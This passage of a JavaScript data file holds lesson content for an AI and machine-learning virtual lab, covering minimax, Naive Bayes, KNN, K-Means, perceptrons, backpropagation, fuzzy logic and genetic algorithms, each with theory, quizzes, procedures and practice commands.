                "O(n log n)",
                "O(2^n)"
            ],
            "correct": 1
        },
        {
            "q": "Constraint propagation is most effective when constraints are:",
            "options": [
                "Binary only",
                "Tightly constrained (few valid assignments)",
                "Loosely constrained",
                "Non-binary"
            ],
            "correct": 1
        }
    ],
    "simType": "ai_csp",
    "practice_commands": [
        "python nqueens_backtrack.py --n 8",
        "python csp_solver.py --forward-check --n 8"
    ],
    "practice_questions": [
        "Model a Sudoku puzzle as a CSP and specify all constraints.",
        "How does the Least Constraining Value (LCV) heuristic work?"
    ]
};

window.VLAB_DATA.ai_minimax = {
    "title": "Minimax with Alpha-Beta Pruning (Game Trees)",
    "aim": "To implement and visualize the Minimax algorithm for two-player zero-sum games and demonstrate how Alpha-Beta pruning reduces the number of nodes evaluated without changing the outcome.",
    "theory": {
        "intro": "Minimax is an adversarial search algorithm used in two-player zero-sum games (Chess, Tic-Tac-Toe, Connect Four). The MAX player tries to maximize the utility score, while the MIN player tries to minimize it. Alpha-Beta Pruning is an optimization that prunes branches of the game tree that cannot affect the final decision, reducing the effective branching factor from b to √b.",
        "cards": [
            {
                "title": "1. Minimax Algorithm",
                "content": "MINIMAX(state, depth, isMaximizing):\n• If terminal state or depth=0: return evaluate(state)\n• If isMaximizing: return max(MINIMAX(child, depth-1, False) for child in state)\n• If isMinimizing: return min(MINIMAX(child, depth-1, True) for child in state)\nTime: O(b^m), Space: O(bm)"
            },
            {
                "title": "2. Alpha-Beta Pruning",
                "content": "Maintains two values:\n• α (alpha): best value MAX can guarantee at this level or above\n• β (beta): best value MIN can guarantee at this level or above\nPrune when α ≥ β. Best case: O(b^(m/2)) — effectively doubles search depth for the same computation budget."
            },
            {
                "title": "3. Evaluation Functions",
                "content": "For non-terminal states at depth limit, an evaluation function estimates the utility. A good evaluation function for Tic-Tac-Toe counts open lines. For Chess, it weighs material (piece values), mobility, king safety, and pawn structure."
            }
        ]
    },
    "pretest": [
        {
            "q": "In Minimax, who is the MAX player?",
            "options": [
                "The AI (maximizes utility)",
                "The opponent (minimizes utility)",
                "Random player",
                "Both players"
            ],
            "correct": 0
        },
        {
            "q": "Alpha-Beta pruning prunes a branch when:",
            "options": [
                "α < β",
                "α ≥ β",
                "α = 0",
                "β = ∞"
            ],
            "correct": 1
        },
        {
            "q": "Minimax without pruning has time complexity:",
            "options": [
                "O(b^m/2)",
                "O(b^m)",
                "O(log n)",
                "O(n²)"
            ],
            "correct": 1
        },
        {
            "q": "Alpha-Beta with optimal move ordering reduces complexity to:",
            "options": [
                "O(b^m)",
                "O(b^(m/2))",
                "O(b^(2m))",
                "O(m)"
            ],
            "correct": 1
        },
        {
            "q": "The terminal state evaluation function returns:",
            "options": [
                "Heuristic estimate",
                "Exact utility value",
                "α value",
                "Branching factor"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Observe the game tree rendered on screen with node values.",
        "2. Click 'Run Minimax' — all nodes light up as they are evaluated bottom-up.",
        "3. Click 'Run Alpha-Beta' — pruned branches are shown in grey.",
        "4. Compare the count of evaluated nodes between both runs.",
        "5. Adjust tree depth to see exponential growth without pruning vs. with pruning."
    ],
    "posttest": [
        {
            "q": "Alpha-Beta pruning changes the optimal decision of Minimax?",
            "options": [
                "Yes, always",
                "Yes, sometimes",
                "No, never",
                "Depends on depth"
            ],
            "correct": 2
        },
        {
            "q": "Which technique further improves Alpha-Beta efficiency?",
            "options": [
                "Move ordering (best moves first)",
                "Increasing depth",
                "Random move selection",
                "Larger branching factor"
            ],
            "correct": 0
        },
        {
            "q": "In a zero-sum game, if MAX gains +5 utility, MIN gains:",
            "options": [
                "+5",
                "0",
                "-5",
                "Undefined"
            ],
            "correct": 2
        },
        {
            "q": "The alpha value represents:",
            "options": [
                "Best MIN score so far",
                "Best MAX score so far",
                "Current depth",
                "Node utility"
            ],
            "correct": 1
        },
        {
            "q": "Expectiminimax extends Minimax to handle:",
            "options": [
                "Multiple players",
                "Chance nodes (stochastic games)",
                "Infinite depth",
                "Parallel search"
            ],
            "correct": 1
        }
    ],
    "simType": "ai_minimax",
    "practice_commands": [
        "python minimax.py --depth 4 --game tictactoe",
        "python alphabeta.py --depth 6"
    ],
    "practice_questions": [
        "Trace Alpha-Beta pruning on a game tree with depth 3 and branching factor 3.",
        "Why is move ordering critical for Alpha-Beta efficiency?"
    ]
};

window.VLAB_DATA.ai_naive_bayes = {
    "title": "Naïve Bayes Classifier",
    "aim": "To implement and simulate a Naïve Bayes classifier on a sample dataset, understanding the application of Bayes' theorem, the conditional independence assumption, and classification accuracy.",
    "theory": {
        "intro": "The Naïve Bayes classifier is a probabilistic machine learning model based on Bayes' Theorem with the strong assumption that features are conditionally independent given the class label. Despite this simplistic assumption, Naïve Bayes performs surprisingly well in text classification, spam filtering, and medical diagnosis.",
        "cards": [
            {
                "title": "1. Bayes' Theorem",
                "content": "$$P(C|X) = \\frac{P(X|C) \\cdot P(C)}{P(X)}$$\nWhere:\n• P(C|X) = Posterior: probability of class C given features X\n• P(X|C) = Likelihood: probability of features X given class C\n• P(C) = Prior: probability of class C\n• P(X) = Evidence (normalizing constant)"
            },
            {
                "title": "2. Naïve Independence Assumption",
                "content": "Assumes all features are conditionally independent:\n$$P(X|C) = \\prod_{i=1}^{n} P(x_i|C)$$\nThis reduces the parameter estimation problem from exponential to linear in the number of features. The classifier chooses: $$\\hat{C} = \\arg\\max_C P(C) \\prod_{i=1}^{n} P(x_i|C)$$"
            },
            {
                "title": "3. Laplace Smoothing",
                "content": "To avoid zero probabilities when a feature-class combination is absent in training data, Laplace smoothing adds a constant α (usually 1) to all counts:\n$$P(x_i|C) = \\frac{\\text{count}(x_i, C) + \\alpha}{\\text{count}(C) + \\alpha \\cdot |V|}$$"
            }
        ]
    },
    "pretest": [
        {
            "q": "Naïve Bayes assumes features are:",
            "options": [
                "Correlated",
                "Conditionally independent given class",
                "Normally distributed",
                "Discrete only"
            ],
            "correct": 1
        },
        {
            "q": "Bayes' theorem computes:",
            "options": [
                "P(X|C)",
                "P(C|X) from P(X|C) and P(C)",
                "P(C) only",
                "Feature correlation"
            ],
            "correct": 1
        },
        {
            "q": "Laplace smoothing is used to handle:",
            "options": [
                "Overfitting",
                "Zero probability problem",
                "High dimensionality",
                "Class imbalance"
            ],
            "correct": 1
        },
        {
            "q": "Naïve Bayes is particularly effective for:",
            "options": [
                "Image classification",
                "Text classification and spam filtering",
                "Time series",
                "Reinforcement learning"
            ],
            "correct": 1
        },
        {
            "q": "The 'naïve' in Naïve Bayes refers to:",
            "options": [
                "Simple implementation",
                "Conditional independence assumption",
                "Small dataset requirement",
                "Binary classification only"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Load the sample dataset (Spam/Ham email features) in the simulator.",
        "2. Observe the training phase: prior probabilities P(C) and likelihoods P(xi|C) being calculated.",
        "3. Enter a new test sample using the input fields.",
        "4. Click 'Classify' to see posterior probabilities computed step-by-step.",
        "5. Compare predicted class vs. actual label and compute accuracy."
    ],
    "posttest": [
        {
            "q": "For Gaussian Naïve Bayes, P(xi|C) is modeled as:",
            "options": [
                "Uniform distribution",
                "Gaussian (normal) distribution",
                "Bernoulli distribution",
                "Poisson distribution"
            ],
            "correct": 1
        },
        {
            "q": "When would Naïve Bayes fail significantly?",
            "options": [
                "Large dataset",
                "Features are highly correlated",
                "Text data",
                "Binary classification"
            ],
            "correct": 1
        },
        {
            "q": "Log probabilities are used in implementation to avoid:",
            "options": [
                "Overflow",
                "Underflow (very small numbers)",
                "Integer rounding",
                "Class imbalance"
            ],
            "correct": 1
        },
        {
            "q": "In spam filtering, Bernoulli Naïve Bayes uses:",
            "options": [
                "Word frequency counts",
                "Binary word presence/absence",
                "TF-IDF scores",
                "Word embeddings"
            ],
            "correct": 1
        },
        {
            "q": "Naïve Bayes has which complexity for training?",
            "options": [
                "O(n²)",
                "O(n·d) where d=features",
                "O(2^d)",
                "O(n log n)"
            ],
            "correct": 1
        }
    ],
    "simType": "ai_naive_bayes",
    "practice_commands": [
        "python naive_bayes.py --train train.csv --test test.csv",
        "python nb_spam.py --email 'free money now'"
    ],
    "practice_questions": [
        "Implement Naïve Bayes for sentiment analysis on movie reviews.",
        "Explain why log probabilities are used instead of raw probabilities."
    ]
};

window.VLAB_DATA.ai_knn = {
    "title": "K-Nearest Neighbors (KNN) Classifier",
    "aim": "To implement and visualize the K-Nearest Neighbors algorithm for classification and regression, studying the effect of K on decision boundaries and model accuracy.",
    "theory": {
        "intro": "K-Nearest Neighbors (KNN) is a non-parametric, instance-based learning algorithm. It makes no assumption about the underlying data distribution. For classification, a new point is assigned the majority class among its K nearest neighbors. For regression, it returns the average value. The choice of K and distance metric critically affect performance.",
        "cards": [
            {
                "title": "1. KNN Algorithm",
                "content": "1. Choose K and a distance metric (Euclidean, Manhattan, Minkowski).\n2. For a new point x: compute distance to all training points.\n3. Select the K closest training points.\n4. Classification: majority vote. Regression: mean of K values.\n\nEuclidean distance: $$d(p,q) = \\sqrt{\\sum_{i=1}^{n}(p_i - q_i)^2}$$"
            },
            {
                "title": "2. Choosing K",
                "content": "• Small K (e.g., K=1): Very sensitive to noise (high variance, low bias). Complex, wiggly decision boundaries.\n• Large K: Smoother boundaries (low variance, high bias). Computationally expensive.\n• Optimal K: Found via cross-validation. Rule of thumb: K = √n where n is training size."
            },
            {
                "title": "3. Curse of Dimensionality",
                "content": "As the number of dimensions increases, the volume of the feature space grows exponentially. Points become equidistant, making nearest-neighbor search ineffective. Solutions: feature selection, PCA dimensionality reduction, or using appropriate distance metrics."
            }
        ]
    },
    "pretest": [
        {
            "q": "KNN is classified as what type of learning?",
            "options": [
                "Eager learning",
                "Instance-based lazy learning",
                "Deep learning",
                "Generative model"
            ],
            "correct": 1
        },
        {
            "q": "A small value of K in KNN results in:",
            "options": [
                "High bias, low variance",
                "Low bias, high variance",
                "High bias, high variance",
                "Low bias, low variance"
            ],
            "correct": 1
        },
        {
            "q": "Which distance metric does KNN use by default?",
            "options": [
                "Manhattan",
                "Euclidean",
                "Cosine",
                "Minkowski p=3"
            ],
            "correct": 1
        },
        {
            "q": "KNN for regression returns:",
            "options": [
                "Majority class label",
                "Mean of K neighbors' values",
                "Median of K neighbors",
                "K class probabilities"
            ],
            "correct": 1
        },
        {
            "q": "The 'curse of dimensionality' affects KNN because:",
            "options": [
                "More data needed to cover space",
                "All points become equidistant",
                "Distance metrics fail",
                "All of the above"
            ],
            "correct": 3
        }
    ],
    "procedure": [
        "1. Load the 2D scatter plot dataset with two classes (Red, Blue).",
        "2. Use the K slider to select a value (1 to 15).",
        "3. Click a point on the canvas to classify it.",
        "4. Observe the K nearest neighbors highlighted with their distances.",
        "5. Watch the decision boundary change as K increases."
    ],
    "posttest": [
        {
            "q": "KNN requires what during prediction time?",
            "options": [
                "Model training",
                "All training data stored in memory",
                "Only class centroids",
                "A decision tree"
            ],
            "correct": 1
        },
        {
            "q": "Weighted KNN assigns higher weight to:",
            "options": [
                "All neighbors equally",
                "Closer neighbors",
                "Farther neighbors",
                "Random neighbors"
            ],
            "correct": 1
        },
        {
            "q": "Time complexity of KNN prediction for N training points and D dimensions:",
            "options": [
                "O(N)",
                "O(N·D)",
                "O(log N)",
                "O(D²)"
            ],
            "correct": 1
        },
        {
            "q": "To handle class imbalance in KNN:",
            "options": [
                "Increase K significantly",
                "Use weighted voting or oversample minority class",
                "Use Euclidean distance only",
                "Reduce K to 1"
            ],
            "correct": 1
        },
        {
            "q": "KD-Tree is used to improve KNN by:",
            "options": [
                "Reducing dimensionality",
                "Speeding up nearest-neighbor search to O(log N)",
                "Replacing distance computation",
                "Adding regularization"
            ],
            "correct": 1
        }
    ],
    "simType": "ai_knn",
    "practice_commands": [
        "python knn_classify.py --k 5 --data iris.csv",
        "python knn_boundary.py --k 3 --dims 2"
    ],
    "practice_questions": [
        "Compare the decision boundaries of KNN with K=1, K=5, and K=15 on the Iris dataset.",
        "How does feature normalization affect KNN performance?"
    ]
};

window.VLAB_DATA.ai_kmeans = {
    "title": "K-Means Clustering",
    "aim": "To implement and animate the K-Means clustering algorithm on 2D data, observing centroid initialization, iterative assignment, centroid update steps, and convergence.",
    "theory": {
        "intro": "K-Means is an unsupervised learning algorithm that partitions n data points into K clusters by minimizing the within-cluster sum of squared distances (inertia). It alternates between two steps: assignment (assign each point to the nearest centroid) and update (recompute centroids as the mean of assigned points), until convergence.",
        "cards": [
            {
                "title": "1. K-Means Algorithm",
                "content": "1. Initialize K centroids (random or K-Means++ method).\n2. Assignment: for each point xi, assign to cluster k* = argmin_k ||xi - μk||²\n3. Update: μk = (1/|Ck|) Σ xi for all xi in cluster Ck\n4. Repeat steps 2-3 until centroids don't change (convergence).\nObjective: minimize $$J = \\sum_{k=1}^{K} \\sum_{x_i \\in C_k} ||x_i - \\mu_k||^2$$"
            },
            {
                "title": "2. Choosing K (Elbow Method)",
                "content": "Plot inertia (total within-cluster variance) vs. K. The 'elbow' point where the rate of decrease sharply slows is the optimal K. Silhouette Score is another metric: values close to 1 indicate well-separated clusters."
            },
            {
                "title": "3. K-Means++ Initialization",
                "content": "K-Means++ selects initial centroids with probability proportional to distance from already-chosen centroids. This reduces the chance of poor initialization, leading to faster convergence and better clustering quality compared to random initialization."
            }
        ]
    },
    "pretest": [
        {
            "q": "K-Means is a type of:",
            "options": [
                "Supervised learning",
                "Semi-supervised learning",
                "Unsupervised clustering",
                "Reinforcement learning"
            ],
            "correct": 2
        },
        {
            "q": "The objective function in K-Means minimizes:",
            "options": [
                "Maximum cluster radius",
                "Within-cluster sum of squared distances (inertia)",
                "Number of iterations",
                "Silhouette score"
            ],
            "correct": 1
        },
        {
            "q": "The Elbow Method is used to determine:",
            "options": [
                "Optimal learning rate",
                "Optimal number of clusters K",
                "Convergence criterion",
                "Centroid positions"
            ],
            "correct": 1
        },
        {
            "q": "K-Means can fail to find the global optimum because it is sensitive to:",
            "options": [
                "Dataset size",
                "Number of features",
                "Initialization of centroids",
                "Distance metric"
            ],
            "correct": 2
        },
        {
            "q": "K-Means assumes clusters are:",
            "options": [
                "Arbitrary shaped",
                "Spherical with similar sizes",
                "Hierarchical",
                "Density-based"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Add data points to the canvas by clicking or auto-generating a random dataset.",
        "2. Set K (number of clusters) using the slider.",
        "3. Click 'Initialize Centroids' to place initial centroids randomly or via K-Means++.",
        "4. Click 'Step' repeatedly to see one assign+update cycle animated.",
        "5. Click 'Run to Convergence' to watch the algorithm complete and observe final clusters."
    ],
    "posttest": [
        {
            "q": "K-Means is NOT suitable for:",
            "options": [
                "Spherical clusters",
                "Clusters of very different sizes and densities",
                "Numeric continuous data",
                "Large datasets"
            ],
            "correct": 1
        },
        {
            "q": "After convergence, the centroid of each cluster is:",
            "options": [
                "The medoid (actual point)",
                "The geometric mean of all points in the cluster",
                "The point with minimum distance to all others",
                "A random point"
            ],
            "correct": 1
        },
        {
            "q": "The Silhouette Score close to -1 indicates:",
            "options": [
                "Perfect clustering",
                "Data point is misclassified",
                "Optimal K found",
                "Convergence achieved"
            ],
            "correct": 1
        },
        {
            "q": "DBSCAN differs from K-Means by:",
            "options": [
                "Requiring K to be specified",
                "Identifying arbitrary-shaped clusters and noise points",
                "Minimizing inertia",
                "Using centroid updates"
            ],
            "correct": 1
        },
        {
            "q": "K-Means++ improves over random initialization in terms of:",
            "options": [
                "Final K value",
                "Convergence speed and quality",
                "Distance metric",
                "Number of iterations fixed"
            ],
            "correct": 1
        }
    ],
    "simType": "ai_kmeans",
    "practice_commands": [
        "python kmeans.py --k 3 --data blobs.csv --init kmeans++",
        "python elbow.py --data blobs.csv --max_k 10"
    ],
    "practice_questions": [
        "Apply K-Means to the Iris dataset and compare cluster purity with true labels.",
        "Explain why K-Means struggles with non-convex clusters like half-moons."
    ]
};

window.VLAB_DATA.ai_ann = {
    "title": "Artificial Neural Network (Perceptron)",
    "aim": "To study the single-layer Perceptron, implement the Perceptron learning rule, and visualize training convergence on linearly separable data, understanding the foundations of neural networks.",
    "theory": {
        "intro": "The Perceptron, introduced by Frank Rosenblatt in 1958, is the simplest neural network unit. It takes binary inputs, applies weights, sums them with a bias, and passes through a step activation function. The Perceptron Learning Rule iteratively adjusts weights to correctly classify all training examples, converging if the data is linearly separable.",
        "cards": [
            {
                "title": "1. Perceptron Model",
                "content": "Output: $$y = \\begin{cases} 1 & \\text{if } \\mathbf{w}^T\\mathbf{x} + b \\geq 0 \\\\ 0 & \\text{otherwise} \\end{cases}$$\nWhere w = weight vector, x = input vector, b = bias.\nGeometrically, the decision boundary is a hyperplane w·x + b = 0."
            },
            {
                "title": "2. Perceptron Learning Rule",
                "content": "For each misclassified sample (xi, yi):\n$$\\mathbf{w} \\leftarrow \\mathbf{w} + \\eta \\cdot (y_i - \\hat{y}_i) \\cdot \\mathbf{x}_i$$\n$$b \\leftarrow b + \\eta \\cdot (y_i - \\hat{y}_i)$$\nWhere η = learning rate. The Perceptron Convergence Theorem guarantees this converges in finite steps if data is linearly separable."
            },
            {
                "title": "3. XOR Limitation",
                "content": "A single-layer Perceptron cannot solve the XOR problem because XOR is NOT linearly separable — no single hyperplane can separate the classes. This requires a Multi-Layer Perceptron (MLP) with at least one hidden layer, which can approximate any continuous function (Universal Approximation Theorem)."
            }
        ]
    },
    "pretest": [
        {
            "q": "The Perceptron uses which activation function?",
            "options": [
                "Sigmoid",
                "ReLU",
                "Step function (threshold)",
                "Tanh"
            ],
            "correct": 2
        },
        {
            "q": "The Perceptron convergence theorem guarantees convergence if:",
            "options": [
                "Learning rate is small",
                "Data is linearly separable",
                "Weights are initialized to zero",
                "Dataset is large"
            ],
            "correct": 1
        },
        {
            "q": "The decision boundary of a Perceptron is:",
            "options": [
                "A curve",
                "A hyperplane",
                "A circle",
                "A polynomial"
            ],
            "correct": 1
        },
        {
            "q": "XOR is not solvable by a single Perceptron because:",
            "options": [
                "Too many features",
                "XOR is not linearly separable",
                "Step function is discontinuous",
                "Learning rate is too small"
            ],
            "correct": 1
        },
        {
            "q": "In the Perceptron rule, weights are updated:",
            "options": [
                "After all epochs",
                "Only for correctly classified samples",
                "Only for misclassified samples",
                "Randomly"
            ],
            "correct": 2
        }
    ],
    "procedure": [
        "1. Plot AND/OR gate training data on the 2D canvas.",
        "2. Initialize weights randomly using the 'Reset' button.",
        "3. Click 'Train Step' to process one epoch and watch weights update.",
        "4. Observe the decision boundary line shift with each epoch.",
        "5. Switch to XOR data to see why training never converges."
    ],
    "posttest": [
        {
            "q": "What happens if you train a Perceptron on non-linearly separable data?",
            "options": [
                "Converges slowly",
                "Converges to near-optimal solution",
                "Never converges (oscillates)",
                "Converges in one step"
            ],
            "correct": 2
        },
        {
            "q": "The Universal Approximation Theorem states that an MLP with one hidden layer:",
            "options": [
                "Can only solve linear problems",
                "Can approximate any continuous function",
                "Cannot handle regression",
                "Requires infinite neurons"
            ],
            "correct": 1
        },
        {
            "q": "Multilayer Perceptrons solved XOR by adding:",
            "options": [
                "More output neurons",
                "Hidden layers with nonlinear activations",
                "Larger learning rate",
                "Bias term"
            ],
            "correct": 1
        },
        {
            "q": "The bias term in a Perceptron:",
            "options": [
                "Scales the input",
                "Shifts the decision boundary",
                "Controls learning rate",
                "Initializes weights"
            ],
            "correct": 1
        },
        {
            "q": "Perceptron learning rule is a special case of:",
            "options": [
                "Stochastic gradient descent",
                "Hebbian learning",
                "Q-learning",
                "Expectation-Maximization"
            ],
            "correct": 0
        }
    ],
    "simType": "ai_ann",
    "practice_commands": [
        "python perceptron.py --data and_gate.csv --epochs 100",
        "python perceptron_xor.py --show-boundary"
    ],
    "practice_questions": [
        "Prove that XOR is not linearly separable by drawing all possible hyperplanes.",
        "How does the bias term affect the Perceptron's decision boundary?"
    ]
};

window.VLAB_DATA.ai_backprop = {
    "title": "Backpropagation & Gradient Descent",
    "aim": "To implement and visualize forward pass, loss computation, and backpropagation through a small Multi-Layer Perceptron (MLP), observing how gradients flow backward and weights are updated via gradient descent.",
    "theory": {
        "intro": "Backpropagation is the algorithm used to train deep neural networks. It computes the gradient of the loss function with respect to each weight by applying the chain rule of calculus. These gradients are used by gradient descent to update weights in the direction that minimizes the loss.",
        "cards": [
            {
                "title": "1. Forward Pass",
                "content": "Each layer computes: z = Wx + b, then a = activation(z).\nCommon activations: Sigmoid σ(z) = 1/(1+e^-z), ReLU max(0,z), Tanh.\nLoss (MSE): L = (1/n)Σ(y - ŷ)². Loss (Cross-Entropy): L = -Σ y·log(ŷ)."
            },
            {
                "title": "2. Backward Pass (Chain Rule)",
                "content": "For output layer: δL = ∂L/∂ŷ · σ'(z)\nFor hidden layers: δ = (W^T · δ_next) · activation'(z)\nWeight gradient: ∂L/∂W = a_prev^T · δ\nBias gradient: ∂L/∂b = Σδ\nWeight update: W = W - η · ∂L/∂W"
            },
            {
                "title": "3. Gradient Descent Variants",
                "content": "• Batch GD: Uses all training data per update. Stable but slow.\n• Stochastic GD (SGD): Uses one sample per update. Noisy but fast.\n• Mini-Batch GD: Uses a subset (batch size 32-256). Best of both worlds.\n• Adam Optimizer: Adaptive learning rates using momentum (first moment) and RMS (second moment)."
            }
        ]
    },
    "pretest": [
        {
            "q": "Backpropagation uses which mathematical rule to compute gradients?",
            "options": [
                "Product rule",
                "Chain rule of calculus",
                "Quotient rule",
                "L'Hopital's rule"
            ],
            "correct": 1
        },
        {
            "q": "Gradient descent updates weights in the direction of:",
            "options": [
                "Positive gradient",
                "Negative gradient (steepest descent)",
                "Zero gradient",
                "Random direction"
            ],
            "correct": 1
        },
        {
            "q": "The vanishing gradient problem occurs when:",
            "options": [
                "Learning rate is too high",
                "Gradients become very small in deep networks",
                "Network has too few layers",
                "Loss is NaN"
            ],
            "correct": 1
        },
        {
            "q": "Which activation function is most commonly used in hidden layers of deep networks?",
            "options": [
                "Step function",
                "Sigmoid",
                "ReLU",
                "Linear"
            ],
            "correct": 2
        },
        {
            "q": "Cross-entropy loss is used for:",
            "options": [
                "Regression tasks",
                "Classification tasks",
                "Unsupervised learning",
                "Reinforcement learning"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. View the 3-layer MLP (2→3→1) with initial random weights displayed.",
        "2. Enter an input sample and click 'Forward Pass' — activations propagate layer by layer.",
        "3. Observe the loss computed at the output layer.",
        "4. Click 'Backprop' to see gradient values flow backward, highlighted red if large.",
        "5. Click 'Update Weights' and watch weights change. Repeat for multiple epochs."
    ],
    "posttest": [
        {
            "q": "If learning rate is too large, gradient descent will:",
            "options": [
                "Converge slowly",
                "Diverge (overshoot minimum)",
                "Converge to global minimum",
                "Not change weights"
            ],
            "correct": 1
        },
        {
            "q": "Batch normalization helps by:",
            "options": [
                "Reducing number of layers",
                "Normalizing layer inputs to stabilize training",
                "Increasing learning rate",
                "Removing gradient computation"
            ],
            "correct": 1
        },
        {
            "q": "Dropout regularization prevents overfitting by:",
            "options": [
                "Adding L2 penalty to weights",
                "Randomly deactivating neurons during training",
                "Reducing learning rate",
                "Adding noise to input data"
            ],
            "correct": 1
        },
        {
            "q": "Adam optimizer adapts learning rate using:",
            "options": [
                "First moment only",
                "Second moment only",
                "Both first and second moments of gradient",
                "Random search"
            ],
            "correct": 2
        },
        {
            "q": "Weight initialization using Xavier/Glorot method prevents:",
            "options": [
                "Underfitting",
                "Vanishing/exploding gradients at initialization",
                "Overfitting",
                "Local minima"
            ],
            "correct": 1
        }
    ],
    "simType": "ai_backprop",
    "practice_commands": [
        "python mlp_train.py --layers 2 3 1 --lr 0.01 --epochs 1000",
        "python backprop_visualize.py --sample 0"
    ],
    "practice_questions": [
        "Derive the backpropagation equations for a 2-layer network with sigmoid activations.",
        "Explain the vanishing gradient problem and two solutions to address it."
    ]
};

window.VLAB_DATA.ai_fuzzy = {
    "title": "Fuzzy Logic Inference System",
    "aim": "To build and simulate a Mamdani Fuzzy Inference System (FIS), demonstrating fuzzification, fuzzy rule evaluation, aggregation, and defuzzification for a temperature control application.",
    "theory": {
        "intro": "Fuzzy Logic, introduced by Lotfi Zadeh (1965), extends classical binary logic to handle degrees of truth. Unlike crisp logic (0 or 1), fuzzy sets allow membership values in [0, 1]. Fuzzy systems are used in control systems (washing machines, car brakes, HVAC) and decision-making under uncertainty.",
        "cards": [
            {
                "title": "1. Fuzzy Sets & Membership Functions",
                "content": "A fuzzy set A in universe X has membership function μA(x) ∈ [0,1].\nCommon shapes: Triangular, Trapezoidal, Gaussian.\nExample: For temperature, 'WARM' could have μ=0 at 15°C, μ=1 at 25°C, μ=0 at 35°C (triangular)."
            },
            {
                "title": "2. Fuzzy Inference Rules",
                "content": "IF-THEN rules connect input fuzzy variables to output:\n• IF temperature IS cool AND humidity IS low THEN fan_speed IS slow\n• IF temperature IS hot THEN fan_speed IS fast\nRule evaluation uses fuzzy AND (min) and OR (max) operators."
            },
            {
                "title": "3. Defuzzification (Centroid Method)",
                "content": "Converts the aggregated fuzzy output set back to a crisp value.\nCentroid (Center of Gravity): $$z^* = \\frac{\\int z \\cdot \\mu(z)\\,dz}{\\int \\mu(z)\\,dz}$$\nOther methods: Mean of Maximum (MOM), Bisector of Area (BOA)."
            }
        ]
    },
    "pretest": [
        {
            "q": "Fuzzy logic allows membership values in the range:",
            "options": [
                "{0,1} only",
                "[0, 1] continuous",
                "[0, ∞)",
                "[-1, 1]"
            ],
            "correct": 1
        },
        {
            "q": "In fuzzy logic, AND is computed as:",
            "options": [
                "Sum of memberships",
                "Min of memberships",
                "Max of memberships",
                "Product of memberships"
            ],
            "correct": 1
        },
        {
            "q": "Defuzzification converts:",
            "options": [
                "Crisp input to fuzzy set",
                "Fuzzy output set to crisp value",
                "Rules to membership functions",
                "Degrees to percentages"
            ],
            "correct": 1
        },
        {
            "q": "The Centroid method of defuzzification returns:",
            "options": [
                "Maximum membership value",
                "Center of gravity of output fuzzy set",
                "Mean of all rule outputs",
                "Minimum output value"
            ],
            "correct": 1
        },
        {
            "q": "Fuzzy systems are best suited for:",
            "options": [
                "Precise mathematical computation",
                "Control in uncertain/imprecise environments",
                "Binary classification only",
                "Statistical analysis"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. View the input membership functions for 'Temperature' (cold, warm, hot).",
        "2. Enter a crisp temperature value (e.g., 28°C) — watch fuzzification compute membership degrees.",
        "3. See fuzzy rules fire with their strength (min of antecedent memberships).",
        "4. Observe rule output sets aggregated using max operation.",
        "5. Defuzzification via centroid computes the crisp fan speed output — watch it animate."
    ],
    "posttest": [
        {
            "q": "Mamdani FIS uses which output representation?",
            "options": [
                "Singleton spikes",
                "Fuzzy sets as output",
                "Crisp numbers only",
                "Probability distributions"
            ],
            "correct": 1
        },
        {
            "q": "Sugeno FIS differs from Mamdani by:",
            "options": [
                "Using more rules",
                "Using crisp function outputs instead of fuzzy sets",
                "Requiring more inputs",
                "Not using defuzzification"
            ],
            "correct": 1
        },
        {
            "q": "Fuzzification converts:",
            "options": [
                "Fuzzy output to crisp value",
                "Crisp input to fuzzy membership degrees",
                "Rules to outputs",
                "Memberships to probabilities"
            ],
            "correct": 1
        },
        {
            "q": "The Hedge 'very' in fuzzy logic is applied as:",
            "options": [
                "μ(x) + 0.5",
                "[μ(x)]²",
                "1 - μ(x)",
                "2·μ(x)"
            ],
            "correct": 1
        },
        {
            "q": "Fuzzy logic differs from probability theory because:",
            "options": [
                "Fuzzy values sum to 1",
                "Fuzzy membership reflects imprecision, not randomness",
                "Both are identical",
                "Fuzzy logic uses Bayes theorem"
            ],
            "correct": 1
        }
    ],
    "simType": "ai_fuzzy",
    "practice_commands": [
        "python fuzzy_fis.py --input 28 --output fan_speed",
        "python fuzzy_plot.py --var temperature"
    ],
    "practice_questions": [
        "Design a Fuzzy Inference System for a car's automatic braking system.",
        "Explain the difference between Mamdani and Sugeno fuzzy inference systems."
    ]
};

window.VLAB_DATA.ai_genetic = {
    "title": "Genetic Algorithm Optimizer",
    "aim": "To implement and visualize a Genetic Algorithm (GA) solving an optimization problem, demonstrating selection, crossover, mutation, and fitness evolution across generations.",
    "theory": {
        "intro": "Genetic Algorithms (GAs) are metaheuristic search algorithms inspired by biological evolution. They maintain a population of candidate solutions (chromosomes), evolve them over generations through selection, crossover, and mutation operators, guided by a fitness function. GAs are effective for complex optimization problems where gradient methods fail.",
        "cards": [
            {
                "title": "1. GA Components",
                "content": "• Chromosome: Binary/real encoding of a solution\n• Population: Set of N chromosomes\n• Fitness Function: f(x) measures solution quality\n• Selection: Tournament, Roulette Wheel (fitness-proportional)\n• Crossover: Single-point, Two-point, Uniform\n• Mutation: Bit-flip, Gaussian noise\n• Elitism: Preserves best chromosomes across generations"
            },
            {
                "title": "2. Selection Mechanisms",
                "content": "Roulette Wheel: P(select i) = f(i) / Σf(j). Biased toward fit individuals.\nTournament: Select k random individuals, pick the best. More controllable.\nRank Selection: Assign selection probability based on rank, not raw fitness. Reduces premature convergence."
            },
            {
                "title": "3. Convergence & Parameters",
                "content": "Key parameters: Population size N (50-500), Crossover rate Pc (0.6-0.9), Mutation rate Pm (0.001-0.01), Generations.\n• High Pc: Exploration of new solutions\n• Low Pm: Maintains diversity without random walk\n• Elitism ensures best solution is never lost between generations"
            }
        ]
    },
    "pretest": [
        {
            "q": "A chromosome in a Genetic Algorithm represents:",
            "options": [
                "A fitness value",
                "A candidate solution to the problem",
                "A generation counter",
                "A mutation operator"
            ],
            "correct": 1
        },
        {
            "q": "Roulette wheel selection probability is proportional to:",
            "options": [
                "Chromosome length",
                "Fitness value of each individual",
                "Generation number",
                "Random value"
            ],
            "correct": 1
        },
        {
            "q": "Crossover in GA combines:",
            "options": [
                "Mutation rates of two parents",
                "Genetic material from two parent chromosomes",
                "Fitness of two populations",
                "Two objective functions"
            ],
            "correct": 1
        },
        {
